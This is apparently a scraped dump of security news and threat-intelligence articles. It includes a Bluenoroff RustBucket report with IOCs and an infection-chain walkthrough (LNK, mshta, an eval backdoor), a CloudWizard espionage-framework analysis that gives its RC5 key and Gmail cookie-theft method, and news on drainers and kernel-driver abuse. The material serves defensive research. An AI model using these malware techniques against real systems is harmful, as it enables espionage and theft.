Windows RustBucket execution flow chartPivoting on the infrastructure used to deliver RustBucket, Sekoia.io analysts retrieved additional infrastructure not exclusively related to the RustBucket activity that we associate to Bluenoroff with high confidence, used to deploy other malware through several infection chains. These infection chains notably include LNK, MSI, OneNote and VHD files. It is possible Bluenoroff is testing new infection chains and malware before shifting or expanding their TTPs.Bluenoroff’s observed initial intrusion vector includes phishing emails, as well as leveraging social networks such as LinkedIn. During our investigations, we identified the domain sarahbeery.docsend[.]me, further analysis led us to the following LinkedIn profile:Figure 5. LinkedIn profile allegedly used by BluenoroffAs of the time of writing, TDR analysts could no longer find this profile on LinkedIn. We assess this likely was a profile used by Bluenoroff after it was leaked to engage with their targets, possibly followed up by a delivery of malicious documents through the docsend sharing platform.While Bluenoroff was seen leveraging updated VHD and CAB files to bypass the Mark-of-the-Web (MOTW) flag until the end of 2022, Sekoia.io did not observe these TTPs in 2023. It is almost certainly a reflection of Bluenoroff’s adaptation efforts after their TTPs were documented in open source, notably by Securelist. In March 2023, we observed new files (MSI file: 5c483473641807082e530744023044fd and One Note file: 4e05597d308d2368625dc19e86a9ca22) containing similar commands to those used in the VHD files reported by Kaspersky.Those files were used to drop and execute 529c65521e8a07c8810b6d225f7e2a89 which is a downloader for a curl-agent that Sekoia.io analysts did not retrieve at the time of writing.As per Sekoia.io analysts’ observations, the network infrastructure is used to host HTTP/HTTPS services leveraged by lure files. This infrastructure is used to download a later stage malware which often is a VBS acting as a backdoor, or a curl-agent downloader. During their investigation, Sekoia.io analysts created automatic trackers to monitor Bluenoroff’s infrastructure evolution. In previous activities, the intrusion set setup HTTP/HTTPS servers with specific characteristics used to host a dozen domains notably typosquatting IT, financial and investment companies.Based on a TDR heuristic, we identified servers used to host domain typo-squatting legitimate organisations, notably pertaining to entities involved in fund management and venture fund, crypto assets and blockchain, located in Europe, Asia, and North America.Figure 6. Financial and technology entities typo-squatted by BluenoroffWhether Bluenoroff’s attempt to target these entities or simply masqueraded as those entities to target other individuals and / or organizations remains an intelligence gap at the time of writing. Regardless, Sekoia.io TDR analysts assess this is in line with past Bluenoroff’s activities, targeting finance-related institutions. Based on typosquatting domains and Sekoia.io attributed levels of confidence, we identified a strong focus on Asia and the U.S.. While this almost certainly stems from the fact that these regions are particularly active in the Fintech area, it is also likely part of Bluenoroff’s geographical targeting assignment. We also retrieved domains indicating a targeting of Laos and Thailand.Figure 7. Bluenoroff targets since September 2022Of note, we also observed that the group may use temporary C2 servers, when testing new techniques, that they then discard rapidly. For instance, in November 2022, Bluenoroff temporarily used a server to transition to using MSI and CAB files (149.28.247[.]34). Similarly, the intrusion set sporadically used a specific server when experimenting with chm (Windows Helper) files (172.86.122[.]181) in December 2022.Sekoia.io analysts assess this activity is part of Bluenoroff’s SnatchCrypto campaign, active since 2017. It is in line with past observed malicious cyber activities, notably pertaining to Pyongyang’ strategic objective of revenue generation to evade sanctions. Of particular interest are Bluenoroff’s observed efforts to develop their offensive capabilities, notably including crossplatform languages to their toolset, and expanding their victimology through the targeting of multiple environments. Sekoia.io analysts assess Bluenoroff’s activities will almost certainly continue in the short to medium term.Samples’ first seen date relates to the time they were first submitted to VirusTotal. Of note, a few samples we identified were tagged as NukeSped in open source, likely due to the confusion between Lazarus and Bluenoroff activities. At the time of writing, Sekoia.io analysts consider NukeSped to be a Lazarus signature malware. IOCs provided in Appendix are all associated to Bluenoroff with high confidence.RustBucket MacOS version2023-05-08\nJump Crypto Investment Agreement.zip\nba5e982596fd03bea98f5de96c1258e56327358e134ceecd1d68e54480533d92\nInternal PDF Viewer.app.zip\n3ed9f34fedca38130776e5adabae363ac797fe89087e04e0c93d83fd62a7a9a4\nZIP\n6ca3a2f4cef27dac9d28c1ec2b29a8fa09dfc6dbbaf58e00dddbf5c1dd3b3cc3\nMach-O - Internal PDF Viewer\nc28e4031129f3e6e5c6fbd7b1cebd8dd21b6f87a8564b0fb9ee741a9b8bc0197\nMach-O\ne2f177b8806923f21a93952b61aedbeb02d829a67a820a7aab5ee72512e3d646\nMach-O\nd6d367453c513445313be7339666e4faeeebeae71620c187012ea5ae2901df34\nPDF - Jump Crypto Investment Agreement.pdf (Key PDF)\n5f00106f7f15e0ca00df4dbb0eeccd57930b4b81bc9aa3fca0c5af4eda339ab7\nPDF - Readme.pdf (Instruction to use the fake reader)\nebad7317e1b01c2231bdbf37dfebdf656e3c8706e719fd37b66f0170b3d5cae0\n2023-05-02\nZIP Internal PDF Viewer.app.zip\ndda8a9e2a2e415be781a39fdf41f1551af2344f1b1a0ddf921d8aeba90343d1b\nMach-O Internal PDF Viewer\n46db9f2fc879bf643a8f05e2b35879b235cbb04aa06fe548f0bc7c7c02483cf3\nMach-O\n5072b28399c874f92e71793fa13207d946a28a2f5903365ac11ddf666d15d086\nMach-O\n3f0d5ddca2657044f4763ae53c4f33c8a7814ba451b60d24430a126674125624\n2023-04-23\nZIP - Internal PDF Viewer 2.app.zip\n61772375af1884fe73c5d154b8637dd62f26d23bc38d18462a88e2bbed483fd7\nSCPT - main.scpt\n7c66d2d75be43d2c17e75d37c39344a9b5d29ee5c5861f178aa7d9f34208eb48\ncloud.dnx[.]capital\n104.255.172[.]56\nZIP - Internal PDF Viewer.zip\nff8832355ae99ffd66d0fe9eda2d74efdf3ed87bb2a4c215b93ade93165f7c0b\nZIP - Internal PDF Viewer.app.zip\n83f457bc81514ec5e3ea123fc237811a36da6ce7f975ad56d62e34af4d1f37c0\nZIP - Internal PDF Viewer 3.app.zip\nb68bf400a23b1053f54911a2b826d341f6bf87c26bea5e6cf21710ee569a7aab\nMach-O - PdfWriter\n3b6f30369a4ee8bf9409d141b6d1b3fb4286c34984b5de005ed7431df549b17e\nlaos.hedgehogvc[.]us\n104.255.172[.]56\n2023-04-21\nMach-O - 703517604263\n9ca914b1cfa8c0ba021b9e00bda71f36cad132f27cf16bda6d937badee66c747\nMach-O\nec8f97d5595d92ec678ffbf5ae1f60ce90e620088927f751c76935c46aa7dc41\nMach-O\n7fccc871c889a4f4c13a977fdd5f062d6de23c3ffd27e72661c986fae6370387\n2023-03-02\nZIP - Internal PDF Viewer.app.zip\nb448381f244dc0072abd4f52e01ca93efaebb2c0a8ea8901c4725ecb1b2b0656\nZIP - Pdf Viewer.zip\nc56a97efd6d3470e14193ac9e194fa46d495e3dddc918219cca530b90f01d11e\nMach-O - Internal PDF Viewer\nbea33fb3205319868784c028418411ee796d6ee3dfe9309f143e7e8106116a49\n2023-02-13 (creation date 2022-12-20)\nZIP - Pdf Viewer.zip\n0d6964fe763c2e6404cde68af2c5f86d34cf50a88bd81bc06bba739010821db0\nZIP - Internal PDF Viewer.app.zip\nea5fac3201a09c3c5c3701723ea9a5fec8bbc4f1f236463d651303f40a245452\nZIP - Internal PDF Viewer.app.zip\n9525f5081a5a7ab7d35cf2fb2d7524e0777e37fe3df62730e1e7de50506850f7\nMach-O - Internal PDF Viewer\ne74e8cdf887ae2de25590c55cb52dad66f0135ad4a1df224155f772554ea970c\nMach-O\n38106b043ede31a66596299f17254d3f23cbe1f983674bf9ead5006e0f0bf880\nMach-O\n7981ebf35b5eff8be2f3849c8f3085b9cec10d9759ff4d3afd46990520de0407\nWindows version of RustBucket\nZIP - PdfViewer.zip\n62a5c6a600051bca4f7b3d11508ca1f968006b71089c71bf87b83ea8b34188e3\nPDF - DOJ Report on Bizlato Investigation.pdf\n8e234482db790fa0a3d2bf5f7084ec4cfb74bffd5f6cbdc5abdbc1350f58e3fe\nDLL - DevExpress.Xpr.v19.2.dll\nf603713bffb9e040bedfd0bb675ff5a6b3205d8bd4e1a3309ea6d1b608871184\nDLL - DevExpress.XtraList.v19.2.dll\n31cec2803bfc7750930d5864400388732a822da96c3f79c98ddee03949aa6a2d\nEXE - PdfViewer.exe\nb3cb7d0b656e8e4852def8548d2cf1edc4e64116434e1f2d9c9b150ee0f9861e\nsafe.doc-share[.]cloud\n172.93.181[.]221\nKey PDF file 2\nPDF - DOJ Report on Bizlato Investigation_asistant.pdf\n07d206664a8d397273e69ce37ef7cf933c22e93b62d95b673d6e835876feba06\nsafe.doc-share[.]cloud\nWindows version of RustBucketActive Bluenoroff C2 serversInactive serversYARA rulesAppendix 1. Bluenoroff’s infection chain.The classical infection chain observed is ZIP > LNK & PDFAs part of their phishing activities, Bluenoroff’s operators send their targets a ZIP archive. The archive contains a non-malicious PDF document and a LNK file masquerading as a TXT file purportedly containing a password to read the PDF, or masquerading as a PDF reader. Launching the LNK file results in downloading a Javascript file from Bluenoroff-controlled C2 server and executing it using mshta.exe. The downloaded file is an obfuscated Javascript: The obfuscation method is straightforward and consists in encoding some characters in UTF-8 and Hex. This script decodes its base64 block, writes it in a file ”tyrbz.js” and runs it with a command line containing the C2 domain as argument. The base64 encoded part is a script dropped on the computer and executed with the C2 domain as argument. The script requests the domain using an HTTP POST request, decodes the base64 encoded response and executes it using ‘eval()‘. The script attempts to contact the C2 server every 15 seconds and acts as a backdoor, allowing the attacker to send commands and scripts to be executed. While we identified a few changes in 2023, this infection chain remains the most frequently observed.Thank you for reading this blogpost.

      "title": "KeePass bug lets attackers extract the master password from memory | SC Media",
      "text": "  A vulnerability discovered last week in the open-source password manager KeePass Password Safe lets attackers extract the master password directly from the software’s memory.The most recent vulnerability exists in versions prior to 2.54 of KeePass 2.x and exposes the risk of malicious actors recovering the clear text master password from various memory sources. The Vulcan Cyber researchers said these sources include KeePass process dumps, swap files, hibernation files, or even full-system RAM dumps. Password managers are a popular way to create and use unique complex passwords for every site or application without having to remember each and every one, explained Mike Parkin, senior technical engineer at Vulcan Cyber. With a password manager, the user only needs to remember the password for one application, rather than potentially dozens. Unfortunately, Parkin said these password managers become very valuable to a threat actor if they can somehow find a flaw and exploit it. “Rather than having access to one of your sites, they have access to all of them,” said Parkin. “The recently discovered flaw in KeePass is a good example of this sort of vulnerability. Fortunately, there appears to be no way to remotely exploit this unless the threat actor already has access to the target system. However, if the system's already been compromised it would be possible to use this attack to potentially gain access to the stored KeePass passwords. As with any security vulnerability, best practice is to update to the latest version as soon as possible and to review vulnerable hosts to make sure they're not already compromised.”Chris Clymer, chief information security officer at Inversion6, added that while this new vulnerability in Keepass is a concern, it’s also heartening to see that a fix has already been made and planned for release soon. Clymer said KeePass users would probably have been better served had the researcher privately disclosed this vulnerability to KeePass and waited for the fix before releasing the exploit code.“There's often pressure for researchers to gain attention by jumping on these issues rapidly and before patches are available to gain attention,” said Clymer. “Ultimately, this attack requires local access to a user's system. In that scenario, an attacker could accomplish similar results by installing a keylogger, or by taking advantage of application and web sessions after a user authenticates. It's not great to hear that the keypass master password is scrapable from memory, but its also not designed to protect against a local attacker. If an attacker simply gains access to the users keypass database, their credentials will still be protected.\"TechCrunch reports that more than a million Maine residents were confirmed by state government officials to have had their personal data compromised as part of the widespread MOVEit file transfer system hack conducted by the Cl0p ransomware operation.U.S. advanced electronic components manufacturer Kyocera AVX Components Corporation has disclosed that 39,111 individuals around the world had their data compromised following a ransomware attack earlier this year, which has been claimed by the LockBit ransomware operation, reports BleepingComputer.U.S. cloud data analytics and log analysis firm Sumo Logic has confirmed discovering a potential security incident after its Amazon Web Services account was accessed using stolen credentials, reports TechCrunch.Thu Dec 7Tue Mar 26On-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

      "text": " The ALPHV ransomware group (aka BlackCat) was observed employing signed malicious Windows kernel drivers to evade detection by security software during attacks.The POORTRY malware is a Windows kernel driver signed using stolen keys belonging to legitimate accounts in Microsoft's Windows Hardware Developer Program.This malicious driver was used by the UNC3944 hacking group, also known as 0ktapus and Scattered Spider, to terminate security software running on a Windows device to evade detection.While security software is usually protected from being terminated or tampered with, as Windows kernel drivers run with the highest privileges in the operating system, they can be used to terminate almost any process.Trend Micro says the ransomware actors attempted to use the Microsoft-signed POORTRY driver, but its detection rates were high following the publicity it got and after the code-signing keys were revoked.Hence, the hackers deployed an updated version of the POORTRY kernel driver signed using a stolen or leaked cross-signing certificate.Furthermore, it may provide a loose link between the ransomware gang and the UNC3944/Scattered Spider hacking groups.The signed driver seen by Trend Micro in February 2023 BlackCat attacks is 'ktgn.sys,' dropped onto the victim's filesystem in the %Temp% folder and then loaded by a user mode program named 'tjr.exe.'The analysts say the digital signature of ktgn.sys has been revoked; however, the driver will still load without a problem on 64-bit Windows systems with enforced signing policies.The malicious kernel driver exposes an IOCTL interface that allows the user mode client, tjr.exe, to issue commands that the driver will execute with Windows kernel privileges.Trend Micro's analysts observed the exposed following commands that can be issued to the driver:Trend Micro comments that the two commands used for Process/Thread Notification callbacks are not working, indicating that the driver is currently under development or still in a testing phase.Windows admins should also ensure that 'Driver Signature Enforcement' is enabled, which blocks the installation of any drivers that do not have a valid digital signature."

      "text": " A cryptocurrency phishing and scam service called 'Inferno Drainer' has reportedly stolen over $5.9 million worth of crypto from 4,888 victims.According to a report by the Web3Anti-Scam firm 'Scam Sniffer,' the phishing service has created at least 689 fake websites since March 27, 2023.Most of the phishing sites came online after May 14, 2023, with the analysts reporting a spike in site-building activity around that time.The malicious websites created with Inferno Drainer target 229 popular brands, including Pepe, Bob, MetaMask, OpenSea, Collab.Land, LayerZero Labs, and others.Scam Sniffer discovered the service after observing an Inferno Drainer member promoting the service on Telegram by posting a screenshot of a $103,000 theft demonstrating their capabilities.Inferno Drainer promotes multichain fraud, Aave token and Art Blocks draining, MetaMask token approval exploits, and more.The authors of the \"drainer\" toolkit provide a modern admin panel with customization options and even offer a trial for interested buyers.Operators pay Inferno Drainer 20% of their proceeds, while the cut goes up to 30% for services that include the creation of phishing sites.However, due to high demand, the service will only offer phishing sites to \"good customers\" or clients who have proven their potential to generate much money.Most assets ($4.3M) were stolen from the Mainnet, $790k were snatched from Arbitrum, $410k from Polygon, and $390k from BNB, totaling $5.9 million.One of the largest victims identified by the analysts lost $400,000 worth of assets. The victim contacted the attackers and offered them 50% of the amount to not legally prosecute them, but the perpetrators ignored those messages.Scam Sniffer says the threat actors distribute the funds they collect from attack fees among five cryptocurrency addresses currently holding between 250 and 400 ETH.Cryptocurrency holders should practice vigilance in all transactions, treat incoming messages with skepticism, verify the sender's identity, use multi-factor authentication to protect their accounts, and keep their software up to date.Ideally, do not disclose any personal information online, and use hardware \"cold\" wallets to store most of your digital assets.Update 5/24 - Article updated to reflect that \"LayerZero\" mentioned in the report is the blockchain company \"LayerZero Labs,\" and not LayerZero Power Systems, who is the holder of the \"LayerZero\" trademark and is not in any way affiliated with the former.LayerZero Power Systems was never targeted, compromised, or in any way impacted by Inferno Drainer."

      "text": " The Irish Data Protection Commission (DPC) has announced a $1.3 billion fine on Facebook after claiming that the company violated Article 46(1) of the GDPR (General Data Protection Regulation).More specifically, it was found that Facebook transferred data of EU-based users of the platform to the United States, where data protection regulations vary per state and have been deemed inadequate to protect the rights of EU data subjects.Article 46(1) of the GDPR forbids transfers of personal data to countries or international organizations that lack safeguards that warrant safety and legal remediation mechanisms.As a result of the infringement, the DPC imposed a record €1.2 billion fine ($1.3 billion) on Facebook's parent company, Meta Ireland, and requested that all data transfers that violate the GDPR be suspended within five months of the decision.Facebook had previously been transferring data between European countries and US under the GDPR's 2016 EU-US Privacy Shield, which allowed the storage of EU data with US companies on the Privacy Shield list.In August 2020, the Irish DPC initiated an inquiry into Meta's data transfer activities. In July 2022, it published a draft decision highlighting that the tech giant was breaching Article 46(1) of the GDPR.Meta has responded to the decision via a blog post, saying that seamless cross-border data transfers are of crucial importance to business continuity, and finds that the administrative fine and restriction orders will have a severe impact on its services in Europe.The company says all transatlantic data transfers are controlled by Standard Contractual Clauses (SCCs) used by all organizations, which the CJEU previously accepted as a valid alternative to ascertain \"legal safeguards.\"\"Like thousands of other businesses, Meta used SCCs believing them to be compliant with the General Data Protection Regulation (GDPR),\" comments the tech giant.The company finds the fine unfair, unnecessary, and disproportionate, and plans to appeal the ruling and contest the severity of the fine and underlying orders."

      "text": "  In a research report published on Wednesday, IT security vendor Sophos said one mobile app developer has raked in $1 million in a month, charging users $7 a week for the same ChatGPT service OpenAI provides for free. (Image Credit: Aleksei Morozov via Getty Images)As one of the fastest-growing consumer applications ever, it’s no surprise ChatGPT has caught the attention of cybercriminals, as well as a curious public.Scammers have been quick to find ways to cash in on the hype around OpenAI’s large-language-model-powered artificial intelligence tool.During its research, Sophos uncovered several ChatGPT-related \"fleeceware\" apps in the Google Play and Apple App Store. These \"FleeceGPT\" apps are so named because the free versions have near-zero functionality, constantly display ads, and coerce unsuspecting users into signing up for a subscription that can cost hundreds of dollars a year. “Scammers have and always will use the latest trends or technology to line their pockets. ChatGPT is no exception,” said Sophos principal threat researcher Sean Gallagher in a statement.The developers of fleeceware deliberately bombard users with ads until they sign up for a subscription, Gallagher said.“They’re banking on the fact that users won’t pay attention to the cost or simply forget that they have this subscription. They’re specifically designed so that they may not get much use after the free trial ends, so users delete the app without realizing they’re still on the hook for a monthly or weekly payment.”During installation, there are prompts to allow the app to track activities across other apps and websites, and to rate the app before it’s even fully launched. Genie also asks for permission to send notifications. These prompts are followed by one encouraging enrollment in a free trial or immediate enrollment in a longer subscription: $7 a week or $70 a year.“Unlike some of the other [FleeceGPT apps], Genie actually works at something approaching full advertised functionality without the trial or subscription — but only accepts four queries per day. It then prompts users with the trial offer again,” the Sophos report said.The researchers advised anyone who discovered they had installed a fleeceware app to be aware that just deleting the app will not end the subscription if they were already paying. Users needed to take specific steps to stop the subscription through their app store account or they will continue to be charged.From November last year through to early April, Unit 42 researchers observed a 910% increase in web domains that were ChatGPT-related. Over the same time frame, they observed a 17,818% growth of related squatting domains from DNS Security logs.Around 118 ChatGPT-related malicious URLs were caught daily by Palo Alto Networks’ URL filtering system.“Typically, scammers create a fake website that closely mimics the appearance of the ChatGPT official website, then trick users into downloading malware or sharing sensitive information,” the Palo Alto report said.Before the release of the ChatGPT API, there were several open-source projects that allowed users to connect to ChatGPT via various automation tools.“Given the fact that ChatGPT is not accessible in certain countries or regions, websites created with these automation tools or the API could attract a considerable number of users from these areas. This also provides threat actors the opportunity to monetize ChatGPT by proxying their service.”To mitigate the risk of being scammed, Unit 42 said ChatGPT users should exercise caution with suspicious emails or links related to ChatGPT, and ensure they only access the service through the official OpenAI website.Simon Hendery is a freelance IT consultant specializing in security, compliance, and enterprise workflows.

      "title": "New API-based attacks on Microsoft Teams underscore the need for wider awareness training  | SC Media",
      "text": "  In this photo illustration a Microsoft Teams logo seen displayed on a smartphone screen in Athens, Greece on May 5, 2023. Threat actors are leveraging account compromise and impersonation and manipulation techniques across Teams, such as using tabs to phish users or entice them to download malware. (Photo illustration by Nikolas Kokovlis/NurPhoto via Getty Images)Threat actors are also leveraging account compromise and impersonation and manipulation techniques across Teams, such as using tabs to phish users or entice them to download malware. By using undocumented Teams API calls, threat actors can reorder and rename tabs so that the original tab gets swapped with a new custom tab.Hackers can leverage this “seemingly benign” feature by using a native app such as “Website,” which lets users pin a chosen website as a tab at the top of a Teams channel or chat. Once they pin a “Website” instance as a tab, an attacker can manipulate the tab’s name, changing it to an existing tab’s name, and then repositioning it. This effectively allows the attackers to push the native tab out of view and increases the chances a user will click instead on a fraudulent tab, one that points to a malicious site, that can pose as a Microsoft 365 sign-in page and phish for credentials.“Although browser security best practices educate users to closely examine key indicators such as the URL bar and to not click on suspicious links, in this case all those instructions are irrelevant, as Teams does not provide a visible URL bar,” said Krisin and Bendet. “Therefore, unsuspecting victims are unlikely to notice that the web page they access is, in fact, malicious.”“This incident reinforces why organizations require runtime insights to continuously monitor their APIs,” said Rago. “Runtime visibility provides a red flag to anomalous behaviors, so organizations can quickly detect new threats and more effectively defend against attacks.”Stephen Gates, principal security subject matter expert at Horizon3.ai, added that APIs are often the weakest link in the chain of unknown risks in the software lifecycle. Developers don’t always understand the hazards associated with APIs since they are usually different than other types of programming, and with the growth of cloud-based microservices, API usage has grown by leaps and bounds.“Even worse, the issues with shadow APIs - the ones no one knows about - and zombie APIs - the ones yet to be decommissioned - often provide doorways into well-known applications,” said Gates. “These APIs are often not being tracked, they are on no one’s radar, and if they were exploited, no one would likely detect it.Georgia Weidman, security architect at Zimperium, added that organizations tend to limit their security awareness training and phishing simulations and protections to email. However, in the real-world, attackers can and are using any mechanism they can to deliver phishing attacks. Because of a lack of training and awareness, mobile vectors such as SMS and NFC, social media platforms Facebook and Twitter, and enterprise collaboration suites such as Microsoft Teams and Zoom are fertile grounds for phishing attacks to succeed.GitHub has updated its Advanced Security platform available for Enterprise Cloud and Enterprise Server customers to provide new artificial intelligence-powered features in a bid to \"revolutionize\" secure app development, reports SecurityWeek.Vulnerabilities in API authorization have been named by Wallarm as the second greatest security risk facing APIs, emphasizing the ease of leveraging authorizations as backdoors as well as the urgent need to ensure authorization maintenance, reports SiliconAngle.BleepingComputer reports that more than $768,000 worth of cryptocurrency assets have been exfiltrated by the fraudulent cryptocurrency management app Ledger Live Web3, which has since been removed from the Microsoft Store.Tue Aug 27 - Wed Aug 28Tue Dec 5On-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

      "title": "Google Voice scams tied to majority of compromised identities | SC Media",
      "text": "  The number of identity crimes reported to the nonprofit Identity Theft Resource Center last year was 14,817, which was slightly off from the all-time high it received in 2021.Victims’ misused identities were mostly used for account takeovers at 61%, while new account creation made up 32% of victims. Social media accounts were still the top type of account takeover in 2022, but about 30% of existing account takeovers were financial accounts — primarily bank and credit card accounts — and 62% were new financial account creations.A whopping 80% of compromised identity credentials were used in scams, up from 77% last year. Scams involving Google Voice again dominated the number of identity compromises, with nearly two-thirds of victims (61%) who contacted the ITRC being victims of the scam. A Google Voice verification scam is a deceptive tactic used by criminals in the United States and overseas to exploit the process of enabling a Google Voice account, explained Scott Hermann, CEO of IDIQ, an identity theft protection and credit monitoring firm that conducted the report with the ITRC.  Scammers will often obtain a victim’s phone number from an online sales listing or social media platform and initiate contact with the victim pretending to be an interested buyer. Saying they want to confirm that the victim is a legitimate seller, the scammer asks the victim to send them a Google verification code so they can create a Google Voice account associated with the victim’s phone number, which lets the scammer engage in fraudulent activity linked to the victim, Hermann continued.Cybersecurity professionals with a Google Voice number, especially one used for work, can be targeted and could have profound implications if it’s associated with their company, Hermann said. It's crucial to educate employees on the importance of using strong passwords and enabling two-factor authentication to help prevent compromised credentials and misuse of company information and platforms, he continued.While the annual report focuses on 2022 statistics, trends from the first quarter of 2023 show that the number of contacts to the center grew compared with the same period last year; assistance for multiple accounts being compromised increased, while single account compromises dropped 10%; and more victims contacted the center for personal information compromise rather than misuse by nearly 20%.However, the news in the first quarter of 2023 isn’t all bad: the ITRC reported a surge in the number of people requesting preventative information.“There's little doubt that generative AI will make detecting and preventing certain kinds of identity crimes more difficult. Technology is agnostic, but users are not,” Lee said. “Financially motivated criminals will use the power of AI to improve the quality of their phishing lures, malicious code, and any kind of attack that can be done at scale.”Stephen Weigand is managing editor and production manager for SC Media.

      "title": "Analysis of the CloudWizard APT framework | Securelist",
      "text": " Solutions for:ThreatsCategories19 May 2023\n  minute read\t\t\t\t\t\t\t\tTable of ContentsAuthorsIn March 2023, we uncovered a previously unknown APT campaign in the region of the Russo-Ukrainian conflict that involved the use of PowerMagic and CommonMagic implants. However, at the time it was not clear which threat actor was behind the attack. Since the release of our report about CommonMagic, we have been looking for additional clues that would allow us to learn more about this actor. As we expected, we have been able to gain a deeper insight into the “bad magic” story.While looking for implants bearing similarities with PowerMagic and CommonMagic, we identified a cluster of even more sophisticated malicious activities originating from the same threat actor. What was most interesting about it is that its victims were located not only in the Donetsk, Lugansk and Crimea regions, but also in central and western Ukraine. Targets included individuals, as well as diplomatic and research organizations. The newly discovered campaign involved using a modular framework we dubbed CloudWizard. Its features include taking screenshots, microphone recording, keylogging and more.Our investigation started with telemetry data coming from an active infection, with malware running as a suspicious Windows service named “syncobjsup”. This service was controlled by a DLL with an equally suspicious path “C:\\ProgramData\\Apparition Storage\\syncobjsup.dll”. Upon execution, we found this DLL to decrypt data from the file mods.lrc that is located in the same directory as the DLL. The cipher used for decryption was RC5, with the key 88 6A 3F 24 D3 08 A3 85 E6 21 28 45 77 13 D0 38. However, decryption of the file with the standard RC5 implementation yielded only junk data. A closer look into the RC5 implementation in the sample revealed that it was faulty:\nThe bug is in the inner loop: it uses the variable i instead of j.What is also interesting is that the key from the gist is the same as the one used in the syncobjsup.dll library.The decrypted file looked to us like a virtual file system (VFS), containing multiple executables and their JSON-encoded configurations:Each entry in this VFS contains magic bytes (‘CiCi’), a ROR6 hash of the entry name, as well as the entry size and contents.Inside mods.lrc, we found:The syncobjsup.dll DLL iterates over VFS entries, looking for an entry with the name “Main” (ROR6 hash: 0xAA23406F). This entry contains CloudWizard’s Main.dll orchestrator library, which is reflectively loaded and launched by invoking its SvcEntry export.Upon launching, the orchestrator spawns a suspended WmiPrvSE.exe process and injects itself into it. From the WmiPrvSE.exe process, it makes a backup of the VFS file, copying mods.lrc to mods.lrs. It then parses mods.lrs to obtain all the framework module DLLs and their configurations. As mentioned above, configurations are JSON files with dictionary objects:\nThe orchestrator itself contains a configuration with parameters such as:After launching modules, the orchestrator starts communicating with the attackers by sending heartbeat messages. Each heartbeat is a JSON file with victim information and a list of loaded modules:\nThis JSON string is encrypted with the cryptography module (Crypton.dll from the VFS) and sent to the attackers with the internet communication module (Internet.dll).In response to the heartbeats, the orchestrator receives commands allowing it to perform module management: install, start, stop, delete modules or change their configurations. Each command contains magic bytes (DE AD BE EF) and a JSON string (e.g., {\"Delete\": [\"Keylogger\", \"Screenshot\"]}), optionally followed by a module DLL file.As we have mentioned above, two modules (Crypton.dll and Internet.dll) are bundled with every installation of the CloudWizard framework. The Crypton module performs encryption and decryption of all communications. It uses two encryption algorithms:The primary cloud storage is OneDrive, while Dropbox and Google Drive are used if OneDrive becomes inaccessible. The module’s configuration includes OAuth tokens required for cloud storage authentication.As for the web server endpoint, it is used when the module can’t access any of the three cloud storages. To interact with it, it makes a GET request to the URL specified in its configuration, getting new commands in response. These commands likely include new cloud storage tokens.While examining the strings of the network module, we found a string containing the directory name from the developer’s machine: D:\\Projects\\Work_2020\\Soft_Version_5\\Refactoring.Information gathering is performed through auxiliary DLL modules that have the following exported functions:Modules can persist upon reboot (in this case they are saved in the mods.lrs VFS file) or executed in memory until the machine is shut down or the module is deleted by the operator.In total, we found nine auxiliary modules performing different malicious activities such as file gathering, keylogging, taking screenshots, recording the microphone and stealing passwords.The module that looked most interesting to us is the one that performs email exfiltration from Gmail accounts. In order to steal, it reads Gmail cookies from browser databases. Then, it uses the obtained cookies to access the Gmail web interface in legacy mode by making a GET request to  https://mail.google.com/mail/u/<account ID>/?ui=html&zy=h. When legacy mode is accessed for the first time, Gmail prompts the user to confirm whether they really wants to switch to legacy mode, sending the following webpage in response:If the module receives such a prompt, it simulates a click on the “I’d like to use HTML Gmail” button by making a POST request to a URL from the prompt’s HTML code.After obtaining the CloudWizard’s orchestrator and its modules, we were still missing one part of the infection chain: the framework installer. While searching through older telemetry data, we were able to identify multiple installers that were used from 2017 to 2020. The version of the implant installed at that time was 4.0 (as we wrote above, the most recent version we observed is 5.0).Afterwards, it creates a service called “Windows Subsystem Service” that is configured to run the WinSubSvc.exe binary on every startup.It is worth noting that the installer displays a message with the text “Well done!” after infection:This may indicate that the installer we discovered is used to deploy CloudWizard via physical access to target machines, or that the installer attempts to mimic a Network Settings (as displayed in the window title) configurator.The old (4.0) and new (5.0) CloudWizard versions have major differences, as outlined in the table below:The following facts allow us to conclude with medium to high confidence that the CloudWizard framework is operated by the actor behind Operation Groundbait and Operation BugDrop:Slide 42 of the VB2019 ‘Rich headers: leveraging the mysterious artifact of the PE format’ talkRetrieval of USB device serial number and product ID in BugDrop (MD5: F8BDE730EA3843441A657A103E90985E)Retrieval of USB device serial number and product ID in CloudWizard (MD5: 39B01A6A025F672085835BD699762AEC)Assignment of the ‘undef’ string in BugDrop (left) and CloudWizard (right) in the samples aboveComparison of the window title text in Prikormka (MD5: 16793D6C3F2D56708E5FC68C883805B5)Addition of the ‘SKYPE’ and ‘VIBER’ string to a set of window titles in CloudWizard (MD5: 26E55D10020FBC75D80589C081782EA2)Use of the same format string for directory listings in Prikormka (above, MD5: EB56F9F7692F933BEE9660DFDFABAE3A) and CloudWizard (below, MD5: BFF64B896B5253B5870FE61221D9934D)Extension lists in Prikormka (left, MD5: EB56F9F7692F933BEE9660DFDFABAE3A) and CloudWizard (right, MD5: BFF64B896B5253B5870FE61221D9934D)As for the similarities between CloudWizard and CommonMagic, they are as follows:The same strings in the internet communication module of CloudWizard (left, MD5: 84BDB1DC4B037F9A46C001764C115A32) and CommonMagic (right, MD5: 7C0E5627FD25C40374BC22035D3FADD8)We initiated our investigation back in 2022, starting with simple malicious PowerShell scripts deployed by an unknown actor and ended up discovering and attributing two large related modular frameworks: CommonMagic and CloudWizard. As our research demonstrates, their origins date back to 2008, the year the first Prikormka samples were discovered. Since 2017, there have been no traces of Groundbait and BugDrop operations. However, the actor behind these two operations has not ceased their activity, and has continued developing their cyberespionage toolset and infecting targets of interest for more than 15 years.NSIS installerLoader (syncobjsup.dll)Orchestrator (Main.dll)Domains and IPsAuthorsCloudWizard APT: the bad magic story goes onYour email address will not be published.

      "title": "Android phones are vulnerable to fingerprint brute-force attacks",
